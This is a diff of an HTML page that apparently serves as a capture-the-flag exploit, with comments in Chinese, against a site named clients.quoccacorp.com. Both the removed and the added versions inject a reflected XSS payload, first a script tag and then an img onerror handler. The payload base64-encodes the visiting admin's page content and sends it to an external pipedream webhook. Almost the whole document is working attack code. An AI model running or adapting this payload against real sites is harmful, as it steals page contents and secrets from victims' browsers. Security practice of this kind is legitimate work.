@@ -1,11 +1,12 @@
-<script>
-    // 1. 定義你的 Webhook
-    const WEBHOOK = "https://eohlv7w2ec4l19w.m.pipedream.net";
-    
-    // 2. 構造一個直接偷取頁面內容的 XSS 網址
-    // 我們利用 btoa 把整個網頁 HTML 轉成 Base64，這樣 Flag 才不會因為特殊字元傳不出來
-    const exploitUrl = "https://clients.quoccacorp.com/?q=<script>fetch('" + WEBHOOK + "?data=' %2b btoa(document.body.innerHTML))<\/script>";
-
-    // 3. 讓 Admin 訪問這個帶有 XSS 的網址
-    window.location.href = exploitUrl;
-</script>
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const WEBHOOK = "https://eohlv7w2ec4l19w.m.pipedream.net";
+        // 改用 location.replace 減少跳轉紀錄，並使用更短的 Payload
+        // 我們直接把 document.body.innerText 傳出去，這通常就包含 Flag 了
+        const payload = `<img src=x onerror="location.href='${WEBHOOK}?f='+btoa(document.body.innerText)">`;
+        window.location.href = "https://clients.quoccacorp.com/?q=" + encodeURIComponent(payload);
+    </script>
+</body>
+</html>
